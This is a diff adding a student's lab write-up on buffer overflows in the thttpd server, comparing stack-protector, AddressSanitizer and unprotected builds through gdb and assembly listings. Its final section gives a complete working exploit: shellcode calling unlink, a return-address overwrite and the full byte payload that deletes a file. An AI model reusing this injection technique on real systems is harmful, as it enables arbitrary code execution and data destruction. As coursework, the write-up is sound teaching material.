+		__interceptor_strchr(starting address of line[100], int 23)
+
+
+		Now, let's take a look at the instructions after the 
+		0x00000000004feb53 <+179>:  callq  0x442050 <__interceptor_strchr(char const*, int)> 
+		to see why it called the error report.
+		(gdb) disas 0x0000000000441e03  <- address from backtrace
+
+		where the error report is called is
+		0x0000000000441dfe <+334>:	callq  0x4cc800 <__asan::ReportGenericError(unsigned long, unsigned long, 
+		 									unsigned long, unsigned long, bool, unsigned long, unsigned int, bool)>
+		First, let's see if it really is called or not, by setting break point.
+		It was hit! so it is called.
+
+		Again, is this the function called because of the error, ro they always call this.
+		Let's figure out by making nonerror case of config.txt like above, which is 50 words.
+		(gdb) info breakpoints
+		Num     Type           Disp Enb Address            What
+		1       breakpoint     keep y   0x00000000004feaa0 in read_config at thttpd.c:1000
+			breakpoint already hit 1 time
+		2       breakpoint     keep y   0x00000000004feb53 in read_config at thttpd.c:1020
+			breakpoint already hit 1 time
+		3       breakpoint     keep y   0x0000000000441dfe in __interceptor_strchr(char const*, int) 
+				                 at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+
+		IT DIDN'T HIT!!
+		which means that we call ReportGenericError when we only have the error.
+		Also, according to 
+		https://github.com/google/sanitizers/wiki/AddressSanitizerAndDebugger
+		When AddressSanitizer finds a bug it calls one of the functions __asan_report_{load,store}{1,2,4,8,16} 
+		which in turn calls __asan::ReportGenericError.
+		So now we found that there is a bug in the program.
+			
+		But
+		How they judged it?
+		
+		Let's see assemblly code around them.
+		(gdb) disas 0x0000000000441dfe
+		0x0000000000441dc8 <+280>:	callq  0x4cfe80 <__asan::HaveStackTraceBasedSuppressions()>
+		0x0000000000441dcd <+285>:	test   %al,%al
+		0x0000000000441dcf <+287>:	lea    -0x850(%rbp),%rax
+		0x0000000000441dd6 <+294>:	mov    %rax,-0x858(%rbp)
+		0x0000000000441ddd <+301>:	jne    0x441e09 <__interceptor_strchr(char const*, int)+345>
+		0x0000000000441ddf <+303>:	callq  0x4d7610 <__sanitizer::StackTrace::GetCurrentPc()>
+		0x0000000000441de4 <+308>:	mov    -0x858(%rbp),%rdx
+		0x0000000000441deb <+315>:	pushq  $0x0
+		0x0000000000441ded <+317>:	mov    %r15,%r9
+		0x0000000000441df0 <+320>:	pushq  $0x0
+		0x0000000000441df2 <+322>:	xor    %r8d,%r8d
+		---Type <return> to continue, or q <return> to quit---
+		0x0000000000441df5 <+325>:	mov    %r14,%rcx
+		0x0000000000441df8 <+328>:	mov    %rbp,%rsi
+		0x0000000000441dfb <+331>:	mov    %rax,%rdi
+		0x0000000000441dfe <+334>:	callq  0x4cc800 <__asan::ReportGenericError(unsigned long, unsigned long, unsigned long, 
+								unsigned long, bool, unsigned long, unsigned int, bool)>
+
+		(gdb) disas 0x0000000000441dfe 
+		see all jump condtino which jump close the report generic error
+		0x0000000000441db1 <__interceptor_strchr(char const*, int)+257>:	74 15	je     0x441dc8 <__interceptor_strchr(char const*, int)+280>
+		we jummped here to 0x441dc8
+
+		0x0000000000441da1 <__interceptor_strchr(char const*, int)+241>:	74 10	je     0x441db3 <__interceptor_strchr(char const*, int)+259>
+		we didn't jump
+
+		0x0000000000441d2a <__interceptor_strchr(char const*, int)+122>:	77 64	ja     0x441d90 <__interceptor_strchr(char const*, int)+224>
+		we did jump to 0x0000000000441d90
+
+		0x0000000000441d20 <__interceptor_strchr(char const*, int)+112>:	0f 84 8d 00 00 00	je     0x441db3 <__interceptor_strchr(char const*, int)+259>
+		we didn't jump
+
+		 0x0000000000441d17 <__interceptor_strchr(char const*, int)+103>:	0f 82 f9 01 00 00	jb     0x441f16 <__interceptor_strchr(char const*, int)+614>
+		 we didn't jump
+
+		 0x0000000000441cff <__interceptor_strchr(char const*, int)+79>:	0f 84 ae 00 00 00	je     0x441db3 <__interceptor_strchr(char const*, int)+259>
+		 we didn't jump
+
+
+		Let me focus on where we jumped to  0x441dc8  since it is the one
+		skip the pop and ret function and jumped cloers to where calling the report generic error
+		0x0000000000441d90 <+224>:	mov    %r15,%rsi
+		0x0000000000441d93 <+227>:	mov    %rbx,%rdi
+		0x0000000000441d96 <+230>:	callq  0x4c7770 <__asan_region_is_poisoned(__sanitizer::uptr, __sanitizer::uptr)>
+		0x0000000000441d9b <+235>:	test   %rax,%rax
+		0x0000000000441d9e <+238>:	mov    %rax,%r14
+		0x0000000000441da1 <+241>:	je     0x441db3 <__interceptor_strchr(char const*, int)+259>
+		0x0000000000441da3 <+243>:	lea    0xe4c56(%rip),%rdi        # 0x526a00
+		0x0000000000441daa <+250>:	callq  0x4cfe30 <__asan::IsInterceptorSuppressed(char const*)>
+		0x0000000000441daf <+255>:	test   %al,%al
+		0x0000000000441db1 <+257>:	je     0x441dc8 <__interceptor_strchr(char const*, int)+280>
+
+		There are two jumps before the last one, but we already saw that it didn't jump.
+		Now, there are two functions are called
+		callq  0x4c7770 <__asan_region_is_poisoned(__sanitizer::uptr, __sanitizer::uptr)> 
+		callq  0x4cfe30 <__asan::IsInterceptorSuppressed(char const*)> 
+		
+		Let's see what these function does?
+		__asan_region_is_poisoned(__sanitizer::uptr, __sanitizer::uptr)
+			It returns true when the region is poisoned.
+			It returns false when the region is poisoned.
+
+			Let's see information of registers around here.
+			rdi            0x7fffffffcc50
+			rsi            0xdb	219
+
+			Returned value from __asan_region_is_poisoned
+			rax            0x7fffffffccb4	140737488342196
+
+		==> meaning region from the starting address of array(1st argument)
+			upto 219bytes is poisoned..
+
+		__asan::IsInterceptorSuppressed(char const*)
+			True if Interceptr is supressed
+			False If Intercepter isn't supressed
+
+			Let's see information of register around here
+			rdi            0x526a00	5401088
+
+			Returned value from IsInterceptorSuppressed
+			rax            0x0	0
+		===> meaning Intercepter isn't supressed.
+
+		Think that what if our result of __asan_region_is_poisone is false??
+		je     0x441db3 <__interceptor_strchr(char const*, int)+259>
+		we will jump 0x441db3, which is
+		0x0000000000441db3 <+259>:	lea    -0x28(%rbp),%rsp
+		0x0000000000441db7 <+263>:	mov    %r12,%rax
+		0x0000000000441dba <+266>:	pop    %rbx
+		0x0000000000441dbb <+267>:	pop    %r12
+		0x0000000000441dbd <+269>:	pop    %r13
+		0x0000000000441dbf <+271>:	pop    %r14
+		0x0000000000441dc1 <+273>:	pop    %r15
+		0x0000000000441dc3 <+275>:	pop    %rbp
+		0x0000000000441dc4 <+276>:	retq  
+
+		It means that the machine would have recognized that there was no
+		stack overflow!!!!!!!
+
+		Also, what if the IsInterceptorSuppressed function returned true?
+		It ignore the jump and go to the same place as above 0x0000000000441db3
+		It means again the machine would have recognized that there was no                                  
+		stack overflow!!!!!!!
+		
+	Conclusion::
+		By above consideration, we caused the calling of ReportGenericError, which
+		means there is an error in the program because of the two factors.
+		First, our array region(0x7fffffffcc50 ~ 0x7fffffffcc50+219) is recongnized as poisoned!
+		Second, the machine fail to Intereceptor to be suppressed!!
+		By those two factor, the machine crushed! Since if those two test was
+		false, and true, respectively, the __interceptor_strchr function safely
+		could return to the read_config function
+
+
+
+============================================================================================================================================
+Problem7: Likewise for variant NO.
+
+	1. Invoke server
+		 src/thttpd-no -p 12119 -D 
+	
+	2. Set config.txt
+		Use
+		
+		VersionE:
+			"port=aaaaa.." upto total 104 words
+		
+		,which is the same as problem5
+		
+
+	3. Run under the GDB
+	
+		gdb --args src/thttpd-no -p 12119 -D -C config.txt
+		(gdb) run
+
+		Version E:
+			gave me hung up
+		Version H:
+			"port=aaaaa.." upto total 217 words
+
+			which is the same as problem 6
+
+		Output:
+			[Thread debugging using libthread_db enabled]
+			Using host libthread_db library "/lib64/libthread_db.so.1".
+
+			Program received signal SIGSEGV, Segmentation fault.
+			0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1192
+			1192	    }
+
+		BackTrace:
+			#0  0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1192
+			#1  0x6161616161616161 in ?? ()
+			#2  0x6161616161616161 in ?? ()
+			#3  0x6161616161616161 in ?? ()
+			#4  0x6161616161616161 in ?? ()
+			#5  0x6161616161616161 in ?? ()
+			#6  0x6161616161616161 in ?? ()
+			#7  0x6161616161616161 in ?? ()
+			#8  0x6161616161616161 in ?? ()
+			#9  0x0000000000000061 in ?? ()
+			#10 0x00007ffff7ddb8d0 in ?? () from /lib64/ld-linux-x86-64.so.2
+			#11 0x00000000000001c8 in ?? ()
+			#12 0x000000000000000a in ?? ()
+			#13 0x0000000000000000 in ?? ()
+
+			I'll use the verseion H of config.txt
+
+
+	4. Why and how happen
+		
+		Recall that we used -z execstack to compile the program,
+		which I explained detain in the beginning.
+		It execute anything on the stack even though it is not executable.
+
+		Let's look at the portion of backtrace below
+			#1  0x6161616161616161 in ?? ()
+			#2  0x6161616161616161 in ?? ()
+			#3  0x6161616161616161 in ?? ()
+			#4  0x6161616161616161 in ?? ()
+			#5  0x6161616161616161 in ?? ()
+			#6  0x6161616161616161 in ?? ()
+			#7  0x6161616161616161 in ?? ()
+			#8  0x6161616161616161 in ?? ()
+			#9  0x0000000000000061 in ?? ()
+
+		Remember that we used a lot of "aaaaaaaa" in the config.txt.
+		When we traslate the a into hex by using ascii encoding,
+		a represents the 61.
+		Which means that we overwrite the many stack with many "aaa"s
+		we can clearly see that from our backtrace.
+
+		#0  0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1192
+		
+		It's obvious that why the program crashed, but let's check what above is doing.
+		(gdb) break *0x0000000000404c8c
+		0x0000000000404c80 <read_config+1104>:	48 83 c4 70	add    $0x70,%rsp
+		0x0000000000404c84 <read_config+1108>:	5b	pop    %rbx
+		0x0000000000404c85 <read_config+1109>:	5d	pop    %rbp
+		0x0000000000404c86 <read_config+1110>:	41 5c	pop    %r12
+		0x0000000000404c88 <read_config+1112>:	41 5d	pop    %r13
+		0x0000000000404c8a <read_config+1114>:	41 5e	pop    %r14
+		=> 0x0000000000404c8c <read_config+1116>:	c3	retq 
+
+		It is return insturction from the read_config function.
+		Unlike above two problems, we didn't set any protection, 
+		so we just execte the all of read_config function until
+		it return.
+		However, as I mentioned above, the return address is overwritten
+		as we see from the backtrack.
+		And because of that, program tried to read or write the illegal memory
+		location.
+		Therefore, the program output the segmentation fault and crashed!!
+
+
+==================================================================================================================
+Problem.8:  Generate the assembly language code for thttpd.c three times, one for each variant, by using gcc -S 
+		    rather than gcc -c -g3 when compiling the file. 
+		    (Use the same -O and -f flags as before.) 
+			Call the resulting files src/thttpd-sp.s and src/thttpd-as.s and src/thttpd-no.s.
+			Compare the three assembly-language files' implementations of the handle_read function. 
+			Describe the techniques used by -fstack-protector-strong and -fsanitize=address 
+			to prevent buffer-overrun exploits in handle_read.
+	
+	Under the src/ directory
+	
+	1. sp
+		$ make clean
+		$ gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
+
+	2. as 
+		$ make clean
+		$ gcc -S -O2 -fno-inline -fsanitize=address -static-libasan -I .. -I . thttpd.c -o thttpd-as.s
+	
+	3. no
+		$ make clean
+		$ gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s
+
+SP:
+	By looking at the original C code for handle_read in the thttpd.c,
+	it is the function where handle the network connection.
+	Recall that -fstack-protector-strong flag, it just put the carnary 
+	into not all functions, but at least a char array of 8 bytes or more in stack
+	as I described at the beginning.
+	If there is a difference between the thttpd-sp.s and thttped-no.s, it must
+	be the insert the carnry into the stack and check the carnary before the function
+	returns.
+	However, in the hanlde_read function in thttpd-sp.s there was no
+	%fs:
+	which represents the carnary as we've seen in the problem 5.
+	(I could find in handle_send function, but not in handle_read)
+	That means, there was no carnary handling inside of handle_read function.
+	Therefore, it has to be no difference between the thttpd-no.s where we didn't
+	put any protection, and
+	By comparing handle_read function in the thttpd-sp.s and thttpd-no.s,
+	I could confirm that there is no difference between them.
+
+AS:
+	On the contrary to above, thttpd-as.s had a lot difference with sp and no.
+	There were many instruction of "jne" for example:
+	jne .L1178
+	jne .L1179
+	jne .L1180
+	jne .L1182 
+
+	and when I traced the distination of them, I reached the area
+	where the machine execute call intructions for example:
+	.L1178:
+		call    __asan_report_load8
+	.L1179:
+		movq    %r12, %rdi
+		call    __asan_report_load8
+	.L1180:
+		movq    %r14, %rdi
+		call    __asan_report_load8 
+	.L1207:
+		movq    %rbp, %rdi
+		call    __asan_report_store4
+	
+	and we can see that they are calling many __asan_report function,
+	which report the checking result of shadow state.
+	As I desribed above, -fsanitize=address will do following:
+	modify the codes to check the shadow state for each memory access and
+	creates poisoned redzones around stack and global objects.(instrumation module)
+	The above instruction is doing that, and reporting when something is wrong.
+
+	
+
+
+
+
+
+==================================================================================================================
+Problem.9: Build an exploit for the bug in variant NO that relies on the attacker tricking the victim into 
+		   invoking thttpd with a particular value for the -C option. (Admittedly this is not much of an exploit, 
+		   but we don't want you to have to put more easily exploitable HTTP servers on our network.) Your exploit 
+		   should cause the victim web server that is invoked via GDB with -C to remove the file target.txt in the 
+		   working directory of the web server. Or, if such an exploit is impossible, explain why not, and investigate 
+		   simple ways to alter the compiler flags 
+		   (or, in the worst case, to insert plausible bugs into the source code) to make the exploit possible.
+
+	1. Invoke server
+		 src/thttpd-no -p 12119 -D 
+		
+
+	2. Run under the GDB
+	
+		gdb --args src/thttpd-no -p 12119 -D -C config.txt
+		(gdb) run
+
+	3. Write the code to delete the file.
+
+		A. what is assemly instruction to delete a file
+			To delete a specified file, in term of assembly language
+			we need to call the system call for x86-64(syscall)
+
+				What is system call?(or kernell call)
+					System call request a service performed by the kernel.
+					It can do the following thing:
+						process management
+						 interprocess communication
+						 memory management
+						 file system
+						 initialization and other
+					and the kernel have the all kinds of system calls above
+					in the system call table
+					(http://www.linfo.org/system_call.html)
+
+			This time we want the kernel to delete a file,
+			so we need find the corresponding system call
+			from the system call table.
+			
+
+			According to https://filippo.io/linux-syscall-table/
+			the system call corresponding to the deleting file
+			is called
+			unlink
+				which does
+				delete a name and possibly the file it refers to
+				int unlink(const char *pathname);
+			we can pass the file name in the first argument to delete
+			the file.
+
+		B. Find out the system call number for unlink
+
+			According to https://filippo.io/linux-syscall-table/
+			unlink instruction's the system call number is
+			87
+			in the decimal
+			we need to store in the rax before the system call.
+			Since we need to write the assembly code, let's change to hex
+			0x57
+
+		C. The file name we want to delete and hex value representaion of that.
+
+			As I mentioned above, we need to pass the file name as the
+			first argument of syscall.
+
+			Here, we are given that we want to delete
+			target.txt
+
+			What is the hex representation of that?
+				I used this on the shell command:
+				echo -n "target.txt" | od -A n -t x1
+					where:
+						-n: don't generate new line
+						| od: octal dump program
+						-A n: --address-radix=none
+							  without it I had
+							  0000000    74  61  72  67  65  74  2e  74  78  74 
+							  0000012
+						-t x1: --format=x1,
+							   x1 = hex 1 byte
+							   without it I had
+							   060564  063562  072145  072056  072170
+					(Reference: https://stackoverflow.com/questions/6791798/convert-string-to-hexadecimal-on-command-line)
+
+				which outputs
+				74  61  72  67  65  74  2e  74  78  74 
+
+
+				CAUTION!!!!!
+					As I described in problem5, fgets function append the null characters onto
+					the strings which passed as argument!!! 
+					So later on DON'T FORGET TO INCLUDE THAT for address calculation!!!
+					Null Character in hex is
+					00
+
+		D. Now we can write the assembly code to delete target.txt file!!
+			
+			remove.s
+			movq $0x57, %rax
+			movq [starting address of sequence "target.txt"], %rdi
+			syscall
+
+
+			before we use objdump to get Hex instruction of above we need to
+			calculate key default address.
+
+	4. Calculate addresses in the stack.
+		
+		There are two address we need to know.
+		A. Starting address of char *line[100]
+		B. The return address of read_config function
+
+		We can find out that by running config.txt like above problems under gdb.
+		But before that we need to change config.txt to under 100 words not to have overwrite
+		in the stack.
+		I used 10 words in the config.txt including "port="
+
+
+		A.
+			We know how to find the startding address of char *line[100]
+			from problem 5.
+			We can see the first argment of fgets.
+			So we need to know the %rdi, before machine call fgets.
+
+			(gdb) break read_cofig
+			(gdb) set disassemble-next-line on
+			(gdb) si
+			and get the disassembly of around read_config
+			(gdb) disas 0x0000000000404830
+
+			0x000000000040486a <+58>:	callq  0x402560 <fgets@plt>
+
+			(gdb) break *0x000000000040486a
+			(gdb) c
+			 0x0000000000404867 <read_config+55>:	48 89 e7	mov    %rsp,%rdi
+			 => 0x000000000040486a <read_config+58>:	e8 f1 dc ff ff	callq  0x402560 <fgets@plt>
+
+			(gdb) info register
+
+			rdi            0x7fffffffcdd0	140737488342480
+
+		OR
+			(gdb) print &line
+
+			The starting address of array line[100] = 0x7fffffffcdd0
+
+			Hex Value:
+				do cd ff ff ff f7 00 00
+
+				CAUTION: we need to put zeros in the end, so that it can fill
+						 64 bits.
+
+		B.
+			To find the return address of read_config function,
+			we need to recall how stack is managed when the function called.
+
+			First, the rip(insturction pointer) points to something like this
+			in other procedure
+			call read_config
+			
+			When we set the break point at
+			(gdb) break read_config
+
+			It stops right aiter the above calling function executes.
+			so rsp must points to the return address
+			(gdb) run 
+			(gdb) info registers
+			rsp            0x7fffffffce68	0x7fffffffce68
+
+			Stack looks like
+
+			Higher
+
+				0x7fffffffce68   return address
+				0x7fffffffce60
+				0x7fffffffce58
+				0x7fffffffce50
+				0x7fffffffce48
+				0x7fffffffce40
+				0x7fffffffce38
+				0x7fffffffce30
+				0x7fffffffce28
+				0x7fffffffce20
+				0x7fffffffce18
+				0x7fffffffce10
+				0x7fffffffce08
+				0x7fffffffce00
+				0x7fffffffcdf8
+
+				............
+				............
+
+				
+				0x7fffffffcdd8 line[8] ~ line[15]
+				0x7fffffffcdd0 line[0] ~ line[7]
+
+			Lower
+
+			Since we want to overwrite the return address
+			0x7fffffffce68 - 0x7fffffffcdd0
+			= 0x98
+			= 152 (decimal)
+			we need 152bytes or 152words to overwrite the return address.
+
+
+	5. Make delete.s and convert to hex style
+	
+		First, we need to decide the starting address to store
+		the character "target.txt"
+		74  61  72  67  65  74  2e  74  78  74
+		,which require 10 bytes
+		since the fgets going to add null charcter onto that,
+		which gonna be
+		11 bytes
+		
+		Let me put them into starting address
+		0x7fffffffce58
+		
+		Therefore our assembly will be
+		
+		remove.s
+			movq $0x57, %rax
+			movq $0x7fffffffce58, %rdi
+			syscall
+
+		then
+		$ gcc -c remove.s
+		$ objdump -d remove.o
+
+		0000000000000000 <.text>:
+			0:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+			7:	48 bf 58 ce ff ff ff 	movabs $0x7fffffffce58,%rdi
+			e:	7f 00 00 
+			11:	0f 05                	syscall 
+
+
+		48 c7 c0 57 00 00 00
+		48 bf 58 ce ff ff ff
+		7f 00 00 
+		0f 05 
+		
+		need 19 bytes.
+
+	6. Make hex.txt
+
+		We need 152bytes to overwrite the return address, and we have
+		152
+		- 16 (target.txt)
+		- 19 (remove.s)
+		= 117 bytes.
+
+		Since we have "port=" in the beggining, which takes 5 bytes
+			Hex value of "port" is 
+			$ echo -n "port=" | od -A n -t x1
+			$ 70  6f  72  74  3d
+
+		so we need
+		117
+		-5
+		= 112 bytes to fill in.
+
+		Let's put 00s 112 times
+
+		We need to be careful to put 00s to fill all 152 bytes.
+		Let's visualize the stack which we want.
+		Value for each needs to be right to left.
+
+		Higher
+
+			0x7fffffffce68   return address
+			0x7fffffffce60  78 74 00 00 00 00 00 00  <== Partial of char "target.txt"
+			0x7fffffffce58	74 61 72 67 65 74 2e 74  <== beginning of char "target.txt"
+			0x7fffffffce50  00 00 00 00 00 00 00 00
+			0x7fffffffce48  00 00 00 00 00 00 00 00
+			0x7fffffffce40  00 00 00 00 00 00 00 00
+			0x7fffffffce38 	00 00 00 00 00 00 00 00
+			0x7fffffffce30	00 00 00 00 00 00 00 00
+			0x7fffffffce28	00 00 00 00 00 00 00 00
+			0x7fffffffce20	00 00 00 00 00 00 00 00
+			0x7fffffffce18	00 00 00 00 00 00 00 00
+			0x7fffffffce10	00 00 00 00 00 00 00 00
+			0x7fffffffce08	00 00 00 00 00 00 00 00
+			0x7fffffffce00	00 00 00 00 00 00 00 00
+			0x7fffffffcdf8	00 00 00 00 00 00 00 00
+			0x7fffffffcdf0  00 00 00 00 00 00 00 00
+			0x7fffffffcde8  00 0f 05 00 00 00 00 00   <== partial of remove instruction
+			0x7fffffffcde0  bf 58 ce ff ff ff 7f 00   <== partial of remove instruction
+			0x7fffffffcdd8  48 c7 c0 57 00 00 00 48   <== beggining of our remove intruction -- LINE A	
+			0x7fffffffcdd0  "port=" 00 00 00          <== "port=" 5 bytes
+
+		Lower
+
+		152 bytes so far!
+		Notice I forgot to add 8 more bytes to
+		over write the return address value!!!
+
+		Now, what we want to overwrite in the return address??
+		Recall that our purpose was removing a file!
+		And we already encode the instruction to do that in the hex!
+		So, when the read_config function return, we want rip
+		to points to the beginnnig of the insturcion, which
+		corresponds to the line A in the above stack!!
+		0x7fffffffcdd8
+		so we need to add this to our hex.txt in the end.
+		Since little endian, it is 
+		d8 cd ff ff ff 7f 00 00
+
+		Then, when the read_config function call fgets, and return
+		our stack looks like this.
+			
+			0x7fffffffce68  d8 cd ff ff ff 7f 00 00  <== points to the beginning of insn to remove file!!
+			0x7fffffffce60  78 74 00 00 00 00 00 00  <== Partial of char "target.txt"
+			0x7fffffffce58	74 61 72 67 65 74 2e 74  <== beginning of char "target.txt"
+			0x7fffffffce50  00 00 00 00 00 00 00 00
+			0x7fffffffce48  00 00 00 00 00 00 00 00
+			0x7fffffffce40  00 00 00 00 00 00 00 00
+			0x7fffffffce38 	00 00 00 00 00 00 00 00
+			0x7fffffffce30	00 00 00 00 00 00 00 00
+			0x7fffffffce28	00 00 00 00 00 00 00 00
+			0x7fffffffce20	00 00 00 00 00 00 00 00
+			0x7fffffffce18	00 00 00 00 00 00 00 00
+			0x7fffffffce10	00 00 00 00 00 00 00 00
+			0x7fffffffce08	00 00 00 00 00 00 00 00
+			0x7fffffffce00	00 00 00 00 00 00 00 00
+			0x7fffffffcdf8	00 00 00 00 00 00 00 00
+			0x7fffffffcdf0  00 00 00 00 00 00 00 00
+			0x7fffffffcde8  00 0f 05 00 00 00 00 00   <== partial of remove instruction
+			0x7fffffffcde0  bf 58 ce ff ff ff 7f 00   <== partial of remove instruction
+			0x7fffffffcdd8  48 c7 c0 57 00 00 00 48   <== beggining of our remove intruction -- LINE A
+			0x7fffffffcdd0  "port=" 00 00 00          <== "port=" 5 bytes
+
+
+	
+	So our hex.txt will be
+	
+		Hex.txt
+		  "port="      00 00 00        ===> don't inlude "port=" in this file, I just type in here
+		48 c7 c0 57 00 00 00 48 			so that easy to see the 8 bytes aligns
+		bf 58 ce ff ff ff 7f 00 
+		00 0f 05 00 00 00 00 00
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00 
+		00 00 00 00 00 00 00 00
+		00 00 00 00 00 00 00 00 
+		74 61 72 67 65 74 2e 74 
+		78 74 00 00 00 00 00 00 
+		d8 cd ff ff ff 7f 00 00
+
+
+	6. make raw.txt
+
+		Now, we need to make hex.txt to raw.txt 
+		since the fgets can convert raw to hex and store
+		the hex into store.
+		We use hex2raw fucntion to make that.
+
+		// get the hex2raw function
+		$ wget http://www.cs.cmu.edu/afs/cs/academic/class/15213-f14/www/code/09-machine-advanced/hex2raw
+
+		// get permission to use that
+		$ chmod 0777 hex2raw
+
+		// Convert to raw and store into raw.txt
+		./hex2raw < hex.txt >> raw.txt
+
+		CAUTION::
+			Remember that we need to put "port=" in the beginning of file
+			since it is equivalent to config.txt in above problems.
+			it will look like this
+			port=^@^@^@HÇÀW^@^@^@H¿XÎÿÿÿ^?^@^@^O^E^@^@^@^@^@^@^@^@^@^@^@^ .................
+
+
+	7. Let's delete the target.txt file!!!
+
+		I put raw.txt and target.txt in the src/ directory
+		since i run under the src/ directory.
+
+		A. Invoke server as usual
+			src/thttpd-no -p 12119 -D
+	
+		B. Check the target.txt if it exits.
+			
+			$ ls target.txt
+			target.txt     <--- telling me it exists
+
+		B. Run under gdb	
+			in the src/ directry
+			gdb --args thttpd-no -p 12119 -D -C raw.txt
+			(gdb) run
+			
+			Output:
+				[Thread debugging using libthread_db enabled]
+				Using host libthread_db library "/lib64/libthread_db.so.1".
+
+				Program received signal SIGSEGV, Segmentation fault.
+				0x00007fffffffcdeb in ?? ()
+
+			(gdb) quit
+
+		D. Check target.txt again
+			
+			$ ls target.txt
+			ls: cannot access 'target.txt': No such file or directory
+
+			which means SUCCESS!!!!!!
+			We remove the target.txt!!!
+
+ 
+ 	8. Address Space Layout Randomization (ASLR)
+		
+		As we did in the above, we successfully inject our
+		remove instruction into the stack. However, it can
+		only success our addresses for return address and
+		starting address of array as we calculate in the beginning.
+
+		ASLR randomize the stack address of every run, so our success is
+		only for temporary.
+		Once they randome the stack address, we need to find the
+		return address and starting address of array to remove a
+		target.txt file. 
+		However, the distance between return address and starting address
+		won't change, meaning the 152(160)bytes between them like above
+		won't change. so our size of hex.txt won't change,
+		Therefore, once we obtained either return address or starting address of array,
+		we can easly make our hex.txt again to remove the file by considering offsets.
+
+
+
